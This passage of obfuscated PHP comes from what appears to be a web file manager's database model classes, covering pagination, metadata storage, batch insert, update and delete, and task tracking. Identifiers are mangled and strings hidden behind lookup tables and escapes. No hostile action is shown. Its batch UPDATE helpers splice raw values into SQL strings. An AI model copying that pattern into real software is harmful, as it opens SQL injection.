$©·×¥Ó = $©·×¥Ó <= 5 ? 5 : ($©·×¥Ó >= $éÚã’ì¸ ? $éÚã’ì¸ : $©·×¥Ó); $…‹Š‘«‹ = intval(isset($in[$¾°±ôÊ[396]]) && $in[$¾°±ôÊ[396]] ? $in[$¾°±ôÊ[396]] : $…‹Š‘«‹); $…‹Š‘«‹ = $…‹Š‘«‹ <= 1 ? 1 : $…‹Š‘«‹; $˜ô¾ÖŸ– = array(); $©¥ëàæĞ = 1; if ($…‹Š‘«‹ == 1 && $©¥ëàæĞ) { $this->optionsValue($—›ùËß); $˜ô¾ÖŸ– = $this->page($…‹Š‘«‹, $©·×¥Ó)->select(); $Û°Èè¿ö = is_array($˜ô¾ÖŸ–) ? count($˜ô¾ÖŸ–) : 0; if ($Û°Èè¿ö < $©·×¥Ó) { $ÏÚğ™Ä² = 1; } else { $this->optionsValue($¦üàÀè¦); $Û°Èè¿ö = intval($this->count()); $ÏÚğ™Ä² = ceil($Û°Èè¿ö / $©·×¥Ó); } } else { $this->optionsValue($¦üàÀè¦); $Û°Èè¿ö = intval($this->count()); $ÏÚğ™Ä² = ceil($Û°Èè¿ö / $©·×¥Ó); $…‹Š‘«‹ = $…‹Š‘«‹ >= $ÏÚğ™Ä² ? $ÏÚğ™Ä² : $…‹Š‘«‹; $this->optionsValue($—›ùËß); $˜ô¾ÖŸ– = $this->page($…‹Š‘«‹, $©·×¥Ó)->select(); } if (!is_array($˜ô¾ÖŸ–)) { $˜ô¾ÖŸ– = array(); } if ($ÏÚğ™Ä² == 1) { $Û°Èè¿ö = count($˜ô¾ÖŸ–); } $ûã±İÆä = array($¾°±ôÊ[409] => array($¾°±ôÊ[410] => $Û°Èè¿ö, $¾°±ôÊ[406] => $©·×¥Ó, $¾°±ôÊ[396] => $…‹Š‘«‹, $¾°±ôÊ[411] => $ÏÚğ™Ä²), $¾°±ôÊ[412] => $˜ô¾ÖŸ–); return $ûã±İÆä; } protected function checkLength($ë¶©ô ï, $ø‹¨ºÀ = 0, $…Åûëû˜ = '') { $é‰ˆÌƒ‚ =& $_SERVER[™»È’øè]; $ø‹¨ºÀ = $ø‹¨ºÀ ? $ø‹¨ºÀ : 65536; if (!$ë¶©ô ï || strlen($ë¶©ô ï) < $ø‹¨ºÀ) { return; } $…Åûëû˜ = $…Åûëû˜ ? $…Åûëû˜ . $é‰ˆÌƒ‚[71] : $é‰ˆÌƒ‚[12]; show_json($…Åûëû˜ . LNG($é‰ˆÌƒ‚[413]) . "\50{$ø‹¨ºÀ}\51", !1); } protected function metaSet($ùş‚¤„, $ªö²œ¨– = null, $‚åíèüç = null) { $©›¶õÌ— =& $_SERVER[™»È’øè]; if (!$this->tableMeta || !$ùş‚¤„) { return !1; } $Ç°¤‰ëç = $this->tableMeta[$©›¶õÌ—[414]]; $ŞçåŸßü = $this->tableMeta[$©›¶õÌ—[415]]; $”·ËƒÂ¬ = Model($ŞçåŸßü); $Çú¿Õ‡ = array($Ç°¤‰ëç => $ùş‚¤„, $©›¶õÌ—[416] => $ªö²œ¨–); if (is_null($ªö²œ¨–)) { return $”·ËƒÂ¬->where(array($Ç°¤‰ëç => $ùş‚¤„))->delete(); } if (is_null($‚åíèüç) && is_string($ªö²œ¨–)) { return $”·ËƒÂ¬->where($Çú¿Õ‡)->delete(); } $ª¯à¶¤ä = is_array($ªö²œ¨–) ? $ªö²œ¨– : array(); if (is_string($ªö²œ¨–)) { $ª¯à¶¤ä[$ªö²œ¨–] = $‚åíèüç; } $À’ã¡™Ø = array(); foreach ($ª¯à¶¤ä as $Ì§÷¦ù¸ => $÷ÅÎ¾©Ö) { if (is_null($÷ÅÎ¾©Ö) && is_string($Ì§÷¦ù¸)) { $”·ËƒÂ¬->where(array($Ç°¤‰ëç => $ùş‚¤„, $©›¶õÌ—[416] => $Ì§÷¦ù¸))->delete(); continue; } $this->checkLength($÷ÅÎ¾©Ö, !1, $ŞçåŸßü . $©›¶õÌ—[4] . $Ì§÷¦ù¸); $À’ã¡™Ø[] = array($Ç°¤‰ëç => $ùş‚¤„, $©›¶õÌ—[94] => $Ì§÷¦ù¸, $©›¶õÌ—[417] => $÷ÅÎ¾©Ö); } $ø‡ó†é³ = $©›¶õÌ—[418] . $ŞçåŸßü; CacheLock::lock($ø‡ó†é³); $”·ËƒÂ¬->where(array($Ç°¤‰ëç => $ùş‚¤„))->addAll($À’ã¡™Ø, array(), !0); CacheLock::unlock($ø‡ó†é³); return !0; } public function metaGet($Í¹ Ò¨Ï, $û¿È¾¬­ = false) { $‘‰î¾í =& $_SERVER[™»È’øè]; if (!$this->tableMeta) { return array(); } $†™ÒĞ± = $this->tableMeta[$‘‰î¾í[414]]; $êòµÙíŠ = Model($this->tableMeta[$‘‰î¾í[415]]); if ($û¿È¾¬­) { $Üâª·äÆ = array($†™ÒĞ± => $Í¹ Ò¨Ï, $‘‰î¾í[94] => $û¿È¾¬­); return $êòµÙíŠ->where($Üâª·äÆ)->getField($‘‰î¾í[417]); } $Üâª·äÆ = array($†™ÒĞ± => $Í¹ Ò¨Ï); $’õúä¯À = $êòµÙíŠ->field($‘‰î¾í[419])->where($Üâª·äÆ)->select(); $’õúä¯À = array_to_keyvalue($’õúä¯À, $‘‰î¾í[94], $‘‰î¾í[417]); return $’õúä¯À; } private function checkDataAutoHas($ƒÎƒ…ùÇ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ááŠø¤™) { if (in_array($ƒÎƒ…ùÇ, explode($_SERVER[™»È’øè][50], $ááŠø¤™[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$µµ¼„Û, $—¼Ä±Û¦) { $íË¹îÚ  =& $_SERVER[™»È’øè]; if (!is_array($µµ¼„Û)) { return; } foreach ($this->dataAuto as $’‡äÆ¯½) { $ŞùğŒá = $’‡äÆ¯½[0]; if (!in_array($—¼Ä±Û¦, explode($íË¹îÚ [50], $’‡äÆ¯½[2]))) { continue; } switch (trim($’‡äÆ¯½[3])) { case $íË¹îÚ [364]: case $íË¹îÚ [365]: $ä—±é– = $’‡äÆ¯½[1]; $à¯¥˜ôà = isset($’‡äÆ¯½[4]) ? (array) $’‡äÆ¯½[4] : array(); if ($ä—±é– == $íË¹îÚ [193] && array_key_exists($ŞùğŒá, $µµ¼„Û)) { if (!$µµ¼„Û[$ŞùğŒá]) { unset($µµ¼„Û[$ŞùğŒá]); } break; } if (isset($µµ¼„Û[$ŞùğŒá])) { array_unshift($à¯¥˜ôà, $µµ¼„Û[$ŞùğŒá]); } if ($íË¹îÚ [364] == $’‡äÆ¯½[3]) { $µµ¼„Û[$ŞùğŒá] = call_user_func_array($ä—±é–, $à¯¥˜ôà); } else { $µµ¼„Û[$ŞùğŒá] = call_user_func_array(array(&$this, $ä—±é–), $à¯¥˜ôà); } break; case $íË¹îÚ [313]: if (isset($µµ¼„Û[$ŞùğŒá]) && $µµ¼„Û[$ŞùğŒá]) { $µµ¼„Û[$ŞùğŒá] = call_user_func_array(array(&$this, $’‡äÆ¯½[1]), array($µµ¼„Û[$ŞùğŒá])); } break; case $íË¹îÚ [316]: $µµ¼„Û[$ŞùğŒá] = $µµ¼„Û[$’‡äÆ¯½[1]]; break; case $íË¹îÚ [337]: if (isset($µµ¼„Û[$ŞùğŒá]) && !is_string($µµ¼„Û[$ŞùğŒá])) { $µµ¼„Û[$ŞùğŒá] = json_encode_force($µµ¼„Û[$ŞùğŒá]); } break; case $íË¹îÚ [366]: if ($µµ¼„Û[$ŞùğŒá] === $íË¹îÚ [12]) { unset($µµ¼„Û[$ŞùğŒá]); } break; case $íË¹îÚ [367]: $µµ¼„Û[$ŞùğŒá] = $’‡äÆ¯½[1]; default: break; } } if ($—¼Ä±Û¦ == $íË¹îÚ [398]) { $¡á¦™ƒı = strtolower($this->db->getDbType()); if (strpos($¡á¦™ƒı, $íË¹îÚ [13]) !== 0) { return; } $ò–Ùóü = $this->field(!0)->fields; $·½ÌÁ†µ = $ò–Ùóü[$íË¹îÚ [295]]; if (isset($ò–Ùóü[$íË¹îÚ [294]])) { unset($·½ÌÁ†µ[$ò–Ùóü[$íË¹îÚ [294]]]); } foreach ($·½ÌÁ†µ as $Ïùã²ªç => $—¼Ä±Û¦) { if (!isset($µµ¼„Û[$Ïùã²ªç])) { $µµ¼„Û[$Ïùã²ªç] = $íË¹îÚ [12]; } } } } private function dataAfterFilter(&$æÂÏıØ) { $£òÂŠôõ =& $_SERVER[™»È’øè]; foreach ($this->dataAuto as $°ÆÎ˜œî) { $Ş¡ÚŠ¥Œ = $°ÆÎ˜œî[0]; if (!isset($æÂÏıØ[$Ş¡ÚŠ¥Œ])) { continue; } if (!in_array($£òÂŠôõ[400], explode($£òÂŠôõ[50], $°ÆÎ˜œî[2]))) { continue; } switch (trim($°ÆÎ˜œî[3])) { case $£òÂŠôõ[364]: case $£òÂŠôõ[365]: $Ÿ”Ş»ˆü = isset($°ÆÎ˜œî[4]) ? (array) $°ÆÎ˜œî[4] : array(); array_unshift($Ÿ”Ş»ˆü, $æÂÏıØ[$Ş¡ÚŠ¥Œ]); if (isset($°ÆÎ˜œî[4]) && $°ÆÎ˜œî[4] == $£òÂŠôõ[420]) { $Ÿ”Ş»ˆü = array($æÂÏıØ[$Ş¡ÚŠ¥Œ]); } if ($£òÂŠôõ[364] == $°ÆÎ˜œî[3]) { $æÂÏıØ[$Ş¡ÚŠ¥Œ] = call_user_func_array($°ÆÎ˜œî[1], $Ÿ”Ş»ˆü); } else { $æÂÏıØ[$Ş¡ÚŠ¥Œ] = call_user_func_array(array(&$this, $°ÆÎ˜œî[1]), $Ÿ”Ş»ˆü); } break; case $£òÂŠôõ[313]: if (isset($æÂÏıØ[$Ş¡ÚŠ¥Œ]) && $æÂÏıØ[$Ş¡ÚŠ¥Œ]) { $æÂÏıØ[$Ş¡ÚŠ¥Œ] = call_user_func_array(array(&$this, $°ÆÎ˜œî[1]), array($æÂÏıØ[$Ş¡ÚŠ¥Œ])); } break; case $£òÂŠôõ[316]: $æÂÏıØ[$Ş¡ÚŠ¥Œ] = $æÂÏıØ[$°ÆÎ˜œî[1]]; break; case $£òÂŠôõ[337]: $»†¼‡ï° = $æÂÏıØ[$Ş¡ÚŠ¥Œ]; $æÂÏıØ[$Ş¡ÚŠ¥Œ] = json_decode($»†¼‡ï°, !0); if (is_null($æÂÏıØ[$Ş¡ÚŠ¥Œ])) { $æÂÏıØ[$Ş¡ÚŠ¥Œ] = $»†¼‡ï°; } break; case $£òÂŠôõ[366]: if ($æÂÏıØ[$Ş¡ÚŠ¥Œ] === $£òÂŠôõ[12]) { unset($æÂÏıØ[$Ş¡ÚŠ¥Œ]); } break; case $£òÂŠôõ[367]: $æÂÏıØ[$Ş¡ÚŠ¥Œ] = $°ÆÎ˜œî[1]; break; default: break; } } } public function saveAll($½‚ˆø··) { $ä¦ãøÇ¬ =& $_SERVER[™»È’øè]; $¶ ƒ’öË = $this->tablePrefix . $this->tableName; $¬üğüò = self::SQL_WHERE_IN_CHUNK; $½‚ˆø·· = is_array($½‚ˆø··) ? $½‚ˆø·· : array(); $ìÄİ¹Î¥ = $ä¦ãøÇ¬[421]; $‚î© = 0; $…ãœÄ‚× = array(); $•Ñ¢¼„ = count($½‚ˆø··); for ($§õæğ˜– = 0; $§õæğ˜– < $•Ñ¢¼„; $§õæğ˜–++) { $÷Ö‰­à = $½‚ˆø··[$§õæğ˜–]; if (!is_array($÷Ö‰­à) || count($÷Ö‰­à) != 4) { continue; } $«‡‘ÓÜğ = "\125\x50\x44\x41\x54\105\x20\140{$¶ ƒ’öË}\x60\40\123\x45\124\x20{$÷Ö‰­à[2]}\40\75\40\x43\x41\123\x45\40{$÷Ö‰­à[0]}\40\xa"; if ($‚î© == 0) { $ìÄİ¹Î¥ = $«‡‘ÓÜğ; } $…ãœÄ‚×[] = $ä¦ãøÇ¬[118] . $÷Ö‰­à[1] . $ä¦ãøÇ¬[118]; $‚î©++; $ìÄİ¹Î¥ .= "\x20\x57\x48\x45\116\x20\47{$÷Ö‰­à[1]}\x27\40\x54\x48\x45\x4e\x20\x27{$÷Ö‰­à[3]}\x27\40\12"; if ($‚î© == $¬üğüò || $§õæğ˜– == $•Ñ¢¼„ - 1) { $”€®µøä = implode($ä¦ãøÇ¬[50], $…ãœÄ‚×); $ìÄİ¹Î¥ .= "\40\105\116\104\x20\40\127\110\105\x52\x45\40{$÷Ö‰­à[0]}\x20\x49\116\40\x28{$”€®µøä}\51\40"; $this->execute($ìÄİ¹Î¥); $‚î© = 0; $ìÄİ¹Î¥ = $«‡‘ÓÜğ; $this->chunkEventCheck(count($…ãœÄ‚×)); $…ãœÄ‚× = array(); } } $this->chunkEventSet(); } public function saveAllEach($ø€ÛŒ±İ) { $ı¦ñäÍï =& $_SERVER[™»È’øè]; $ŠšÜ = $this->tablePrefix . $this->tableName; foreach ($ø€ÛŒ±İ as $Ï§ıÚÂ) { if (!is_array($Ï§ıÚÂ) || count($Ï§ıÚÂ) != 4) { continue; } $©®‚š‘ = $Ï§ıÚÂ[0] . $ı¦ñäÍï[422] . $Ï§ıÚÂ[1] . $ı¦ñäÍï[118]; $“ëÔáé = $Ï§ıÚÂ[2] . $ı¦ñäÍï[422] . $Ï§ıÚÂ[3] . $ı¦ñäÍï[118]; $³õ³Õ§„ = "\x75\160\144\141\x74\145\x20{$ŠšÜ}\40\x73\145\x74\x20{$“ëÔáé}\x20\x77\150\x65\x72\145\x20{$©®‚š‘}\73"; $this->execute($³õ³Õ§„); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($“ëü½ˆÔ = false, $ôÉ’Æ“Î = false) { $this->_chunkEvent = $“ëü½ˆÔ; $this->_chunkEventParam = $ôÉ’Æ“Î; } private function chunkEventCheck($ÏÁ¸ó) { if (!$this->_chunkEvent) { return; } $­‘²µå½ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $­‘²µå½[$_SERVER[™»È’øè][423]] = $ÏÁ¸ó; Hook::trigger($this->_chunkEvent, $­‘²µå½); } public function addAll($Í‚ŸØŸò, $õ™ä–‹ = array(), $ûÒßÈ‡å = false) { $Ï”€´Óˆ =& $_SERVER[™»È’øè]; ignore_timeout(); $¥¡¼´–Ğ = self::SQL_WHERE_IN_CHUNK; if (empty($Í‚ŸØŸò)) { $this->error = think_lang($Ï”€´Óˆ[314]); return !1; } $õ™ä–‹ = $this->_parseOptions($õ™ä–‹); foreach ($Í‚ŸØŸò as $ĞĞÁßåÓ => $…êğ²) { $Í‚ŸØŸò[$ĞĞÁßåÓ] = $this->_facade($…êğ²); $this->_beforeInsert($Í‚ŸØŸò[$ĞĞÁßåÓ], $õ™ä–‹); } if (method_exists($this->db, $Ï”€´Óˆ[315])) { for ($ûƒÎå…â = 0; $ûƒÎå…â < count($Í‚ŸØŸò); $ûƒÎå…â += $¥¡¼´–Ğ) { $ÁÚüÈ = array_slice($Í‚ŸØŸò, $ûƒÎå…â, $¥¡¼´–Ğ); if (!is_array($ÁÚüÈ) || count($ÁÚüÈ) == 0) { break; } $Âü±¬¸¹ = $this->db->insertAll($ÁÚüÈ, $õ™ä–‹, $ûÒßÈ‡å); $this->chunkEventCheck(count($ÁÚüÈ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Í‚ŸØŸò as $ĞĞÁßåÓ => $…êğ²) { $Âü±¬¸¹ = $this->db->insert($…êğ², $õ™ä–‹, $ûÒßÈ‡å); } $this->commit(); } if (!1 !== $Âü±¬¸¹) { $ğµ”Î€š = $this->getLastInsID(); if ($ğµ”Î€š) { return $ğµ”Î€š; } } return $Âü±¬¸¹; } public function save($€ß¬£  = '', $³“õêò = array()) { $­§Œ¬¢² =& $_SERVER[™»È’øè]; $ĞÛ€§Åã = self::SQL_WHERE_IN_CHUNK; $òÇ¿ôç£ = $this->optionsValue(); $­ÔŒ†ˆâ = $this->findWhereField($òÇ¿ôç£); if (!$­ÔŒ†ˆâ) { return parent::save($€ß¬£ , $³“õêò); } $Š ş­ëŒ = 0; $•´“øÌ» = $òÇ¿ôç£[$­§Œ¬¢²[318]][$­ÔŒ†ˆâ][1]; $•´“øÌ» = is_array($•´“øÌ») ? $•´“øÌ» : array(); $÷åæ³¦Ş = count($•´“øÌ»); for ($˜Ç Ãş = 0; $˜Ç Ãş < $÷åæ³¦Ş; $˜Ç Ãş += $ĞÛ€§Åã) { $Ş°üêÍ³ = array_slice($•´“øÌ», $˜Ç Ãş, $ĞÛ€§Åã); if (!is_array($Ş°üêÍ³) || count($Ş°üêÍ³) == 0) { break; } $òÇ¿ôç£[$­§Œ¬¢²[318]][$­ÔŒ†ˆâ][1] = $Ş°üêÍ³; $this->optionsValue($òÇ¿ôç£); $Š ş­ëŒ += parent::save($€ß¬£ , $³“õêò); $this->chunkEventCheck(count($Ş°üêÍ³)); } $this->chunkEventSet(); return $Š ş­ëŒ; } public function add($ı••×Ô = '', $íÈ™œğà = array(), $ú¼û‰Õ = false) { if ($this->addTaskStatus && is_array($ı••×Ô)) { $this->addTaskData[] = $ı••×Ô; return; } return parent::add($ı••×Ô, $íÈ™œğà, $ú¼û‰Õ); } public function parseWhereLike($ô¿ÈÆä, $«Ğ÷èî = '', $ƒúøš³ì = false, &$¨›â¥Íš = false) { $›ÏœÃ® =& $_SERVER[™»È’øè]; $Áõ¡î×ƒ = $GLOBALS[$›ÏœÃ®[6]][$›ÏœÃ®[424]]; if (!$Áõ¡î×ƒ[$›ÏœÃ®[425]]) { return $ô¿ÈÆä; } if (!is_array($ô¿ÈÆä)) { return $ô¿ÈÆä; } $§ƒ¹ƒŸø = array(); $¨é§ÎüÃ = 0; foreach ($ô¿ÈÆä as $ÑâŠ·Äù => $Üƒ²ù¨Ğ) { if (is_array($Üƒ²ù¨Ğ) && count($Üƒ²ù¨Ğ) == 2 && $Üƒ²ù¨Ğ[0] == $›ÏœÃ®[426] && is_string($Üƒ²ù¨Ğ[1]) && substr($Üƒ²ù¨Ğ[1], 0, 1) == $›ÏœÃ®[427] && substr($Üƒ²ù¨Ğ[1], strlen($Üƒ²ù¨Ğ[1]) - 1, 1) == $›ÏœÃ®[427]) { $¨›â¥Íš = !0; $Å‡üƒçÆ = is_string($ÑâŠ·Äù) ? $ÑâŠ·Äù : $«Ğ÷èî; $¼™Ø´³™ = substr($Üƒ²ù¨Ğ[1], 1, strlen($Üƒ²ù¨Ğ[1]) - 2); $¼™Ø´³™ = $this->db->escapeString($¼™Ø´³™); if (!strpos($Å‡üƒçÆ, $›ÏœÃ®[10])) { $Å‡üƒçÆ = $›ÏœÃ®[428] . $Å‡üƒçÆ . $›ÏœÃ®[428]; } $ì‚¾Ãåé = $›ÏœÃ®[202] . $¼™Ø´³™ . $›ÏœÃ®[202]; $¼™Ø´³™ = str_replace(array($›ÏœÃ®[10], $›ÏœÃ®[429], $›ÏœÃ®[11]), $›ÏœÃ®[430], $¼™Ø´³™); if ($Áõ¡î×ƒ[$›ÏœÃ®[431]]) { $ì‚¾Ãåé = $›ÏœÃ®[432] . $¼™Ø´³™ . $›ÏœÃ®[433]; if ($Áõ¡î×ƒ[$›ÏœÃ®[434]]) { $ì‚¾Ãåé = $›ÏœÃ®[433] . $¼™Ø´³™ . $›ÏœÃ®[432]; } } $§ƒ¹ƒŸø[$¨é§ÎüÃ] = $›ÏœÃ®[435] . $Å‡üƒçÆ . $›ÏœÃ®[436] . $ì‚¾Ãåé . $›ÏœÃ®[437]; $¨é§ÎüÃ++; continue; } if (is_array($Üƒ²ù¨Ğ)) { $«Ğ÷èî = is_string($ÑâŠ·Äù) ? $ÑâŠ·Äù : $«Ğ÷èî; $Üƒ²ù¨Ğ = $this->parseWhereLike($Üƒ²ù¨Ğ, $«Ğ÷èî, !0, $¨›â¥Íš); } if (is_numeric($ÑâŠ·Äù)) { $§ƒ¹ƒŸø[$¨é§ÎüÃ] = $Üƒ²ù¨Ğ; $¨é§ÎüÃ++; } else { $§ƒ¹ƒŸø[$ÑâŠ·Äù] = $Üƒ²ù¨Ğ; } } if ($¨›â¥Íš && !$ƒúøš³ì) { } return $§ƒ¹ƒŸø; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($“Æ©‹¢œ = array()) { $á†Õ­Ú =& $_SERVER[™»È’øè]; $»¦Èœ˜Š = self::SQL_WHERE_IN_CHUNK; $•šÈøü = $this->optionsValue(); $ÕœöÏ«¼ = $this->findWhereField($•šÈøü); if (!$ÕœöÏ«¼ || isset($•šÈøü[$á†Õ­Ú[335]]) || isset($•šÈøü[$á†Õ­Ú[396]])) { return parent::select($“Æ©‹¢œ); } $½‹­È³• = $•šÈøü[$á†Õ­Ú[318]][$ÕœöÏ«¼][1]; $½‹­È³• = is_array($½‹­È³•) ? $½‹­È³• : array(); $›£á•ÕË = null; for ($†Ï†ö‰ò = 0; $†Ï†ö‰ò < count($½‹­È³•); $†Ï†ö‰ò += $»¦Èœ˜Š) { $šÊÚ‘íâ = array_slice($½‹­È³•, $†Ï†ö‰ò, $»¦Èœ˜Š); if (!is_array($šÊÚ‘íâ) || count($šÊÚ‘íâ) == 0) { break; } $•šÈøü[$á†Õ­Ú[318]][$ÕœöÏ«¼][1] = $šÊÚ‘íâ; $this->optionsValue($•šÈøü); $äÌ½ = parent::select($“Æ©‹¢œ); if (!$äÌ½) { continue; } $›£á•ÕË = is_array($›£á•ÕË) ? $›£á•ÕË : array(); $›£á•ÕË = array_merge($›£á•ÕË, $äÌ½); } return $›£á•ÕË; } public function delete($†²å®–– = array()) { $°Îó·¾ =& $_SERVER[™»È’øè]; $‰‹…¹ßü = self::SQL_WHERE_IN_CHUNK; $¸ÒÆÔ®ü = $this->optionsValue(); $Ëñè®€ = $this->findWhereField($¸ÒÆÔ®ü); if (!$Ëñè®€) { return parent::delete($†²å®––); } $øÆ²Š€Í = 0; $Ûá‘ ™ = $¸ÒÆÔ®ü[$°Îó·¾[318]][$Ëñè®€][1]; $Ûá‘ ™ = is_array($Ûá‘ ™) ? $Ûá‘ ™ : array(); for ($ìÈ¸¬ó™ = 0; $ìÈ¸¬ó™ < count($Ûá‘ ™); $ìÈ¸¬ó™ += $‰‹…¹ßü) { $Ô’§¡«è = array_slice($Ûá‘ ™, $ìÈ¸¬ó™, $‰‹…¹ßü); if (!is_array($Ô’§¡«è) || count($Ô’§¡«è) == 0) { break; } $¸ÒÆÔ®ü[$°Îó·¾[318]][$Ëñè®€][1] = $Ô’§¡«è; $this->optionsValue($¸ÒÆÔ®ü); $øÆ²Š€Í += parent::delete($†²å®––); } return $øÆ²Š€Í; } private function findWhereField($ÎÊ‰×ÌÉ) { $ğ»¡ôµ =& $_SERVER[™»È’øè]; $éÈôç¾ˆ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÎÊ‰×ÌÉ) || !is_array($ÎÊ‰×ÌÉ[$ğ»¡ôµ[318]])) { return !1; } foreach ($ÎÊ‰×ÌÉ[$ğ»¡ôµ[318]] as $†ºÉÌ°‹ => $ıóúÎĞ) { if (is_array($ıóúÎĞ) && isset($ıóúÎĞ[0]) && is_string($ıóúÎĞ[0]) && strtolower($ıóúÎĞ[0]) == $ğ»¡ôµ[7] && is_array($ıóúÎĞ[1]) && count($ıóúÎĞ[1]) > $éÈôç¾ˆ) { ignore_timeout(); return $†ºÉÌ°‹; } } return !1; } public function setMasterDB($£’ëÌ = true) { think_config($_SERVER[™»È’øè][438], $£’ëÌ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\145\155\x4f\x70\164\x69\x6f\156"; public $field = array(); public function listData($²ÎÃÚ¤´ = false, $­ŠØÌŞö = "\155\x6f\x64\151\146\171\x54\x69\x6d\145", $ÎØ¼†’‰ = false) { $ì„¦ü¡Î = Model($this->modelType)->get(!1, $this->optionType, !0); $Ÿ¿ Ÿ¾÷ = array_values($ì„¦ü¡Î); if ($Ÿ¿ Ÿ¾÷ && $Ÿ¿ Ÿ¾÷[0] && !is_array($Ÿ¿ Ÿ¾÷[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ì„¦ü¡Î = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ì„¦ü¡Î) { return $²ÎÃÚ¤´ ? null : array(); } if (!$²ÎÃÚ¤´) { $ì„¦ü¡Î = array_filter(array_values($ì„¦ü¡Î)); return array_sort_by($ì„¦ü¡Î, $­ŠØÌŞö, $ÎØ¼†’‰); } return $ì„¦ü¡Î[$_SERVER[™»È’øè][439] . $²ÎÃÚ¤´]; } public function insert($äôã—”) { $Ü¼– =& $_SERVER[™»È’øè]; $äôã—” = array_field_key($äôã—”, $this->field); $†É—–ĞŒ = Model($this->modelType)->get($Ü¼–[440], $this->optionType . $Ü¼–[441]); $†É—–ĞŒ = $†É—–ĞŒ ? $†É—–ĞŒ : 0; $äôã—”[$Ü¼–[442]] = ++$†É—–ĞŒ; $äôã—”[$Ü¼–[214]] = time(); $äôã—”[$Ü¼–[85]] = time(); Model($this->modelType)->set($Ü¼–[440], $†É—–ĞŒ, $this->optionType . $Ü¼–[441]); Model($this->modelType)->set($Ü¼–[439] . $†É—–ĞŒ, $äôã—”, $this->optionType); return $†É—–ĞŒ; } public function update($ÑªäÊëı, $öËñªÙ˜) { $­÷Šò‡ =& $_SERVER[™»È’øè]; $öËñªÙ˜ = array_field_key($öËñªÙ˜, $this->field); $öÎšáš† = $this->listData($ÑªäÊëı); if (!$öÎšáš† || !$ÑªäÊëı) { return !1; } $öËñªÙ˜ = array_merge($öÎšáš†, $öËñªÙ˜); $öËñªÙ˜[$­÷Šò‡[85]] = time(); return Model($this->modelType)->set($­÷Šò‡[439] . $ÑªäÊëı, $öËñªÙ˜, $this->optionType); } public function remove($Ñ’âşÏÃ) { if (!$Ñ’âşÏÃ) { return !1; } return Model($this->modelType)->remove($_SERVER[™»È’øè][439] . $Ñ’âşÏÃ, $this->optionType); } public function clear() { $œê•÷Ä =& $_SERVER[™»È’øè]; Model($this->modelType)->remove($œê•÷Ä[440], $this->optionType . $œê•÷Ä[441]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($·£ñÑİ×, $ôî¼úÆ§) { if (!$ôî¼úÆ§) { return !1; } $ Åßùƒ = $this->listData(); $ Åßùƒ = array_to_keyvalue($ Åßùƒ, $·£ñÑİ×); return isset($ Åßùƒ[$ôî¼úÆ§]) ? $ Åßùƒ[$ôî¼úÆ§] : !1; } public function findByName($³Æöö°Å) { return $this->findByKey($_SERVER[™»È’øè][32], $³Æöö°Å); } protected function resetData($ÆÀõ÷Á£) { $ùì×ëÃ² =& $_SERVER[™»È’øè]; $ÆÀõ÷Á£ = is_array($ÆÀõ÷Á£) ? $ÆÀõ÷Á£ : array(); $ä„Á¼šÔ = array(); for ($é¨¯İ÷¡ = 0; $é¨¯İ÷¡ < count($ÆÀõ÷Á£); $é¨¯İ÷¡++) { $ä„Á¼šÔ[$ùì×ëÃ²[439] . $ÆÀõ÷Á£[$é¨¯İ÷¡][$ùì×ëÃ²[442]]] = $ÆÀõ÷Á£[$é¨¯İ÷¡]; } return Model($this->modelType)->set($ä„Á¼šÔ, !1, $this->optionType); } private function getAutoName($Ù¦õŸ¦•) { $­§äŸ‚¥ = array_to_keyvalue($this->listData(), $_SERVER[™»È’øè][32]); if (!$­§äŸ‚¥ || !isset($­§äŸ‚¥[$Ù¦õŸ¦•])) { return $Ù¦õŸ¦•; } for ($„ ­ßŞƒ = 1; $„ ­ßŞƒ < count($­§äŸ‚¥); $„ ­ßŞƒ++) { $¾½®“‡Ï = $Ù¦õŸ¦• . "\x28{$„ ­ßŞƒ}\x29"; if (!isset($­§äŸ‚¥[$¾½®“‡Ï])) { return $¾½®“‡Ï; } } return $¾½®“‡Ï; } } goto fØêÒ§Ğ“Ö; fñ‰–ğˆÅÂ: class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\156\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($úïöÁô¹, $ŸúŒ±¼¨ = '', $ÀèÊ = 0, $½’†î©ƒ = '') { $¡„À˜å =& $_SERVER[™»È’øè]; if (self::get($úïöÁô¹)) { return; } $this->task = array($¡„À˜å[442] => $úïöÁô¹, $¡„À˜å[1678] => USER_ID, $¡„À˜å[1573] => $½’†î©ƒ, $¡„À˜å[493] => $¡„À˜å[12], $¡„À˜å[33] => $ŸúŒ±¼¨, $¡„À˜å[1094] => $¡„À˜å[12], $¡„À˜å[811] => $ÀèÊ, $¡„À˜å[1679] => 0, $¡„À˜å[1680] => 0, $¡„À˜å[1681] => 0, $¡„À˜å[1682] => timeFloat(), $¡„À˜å[1683] => 0, $¡„À˜å[1684] => 0, $¡„À˜å[1685] => 0, $¡„À˜å[1686] => 0, $¡„À˜å[775] => $¡„À˜å[1634]); $GLOBALS[$¡„À˜å[1687]] = 1; Hook::bind($¡„À˜å[1638], array($this, $¡„À˜å[1688])); Hook::bind($¡„À˜å[1689], array($this, $¡„À˜å[1690])); $this->startAfter(); Hook::trigger($¡„À˜å[1691], $this->task); $this->task[$¡„À˜å[1684]] = timeFloat(); } public function end($éª±Õ¥± = '') { $û¢šÊËî =& $_SERVER[™»È’øè]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$û¢šÊËî[1684]]) { self::valueSet($this->task[$û¢šÊËî[442]], !1); } $this->isEnd = !0; if ($éª±Õ¥±) { 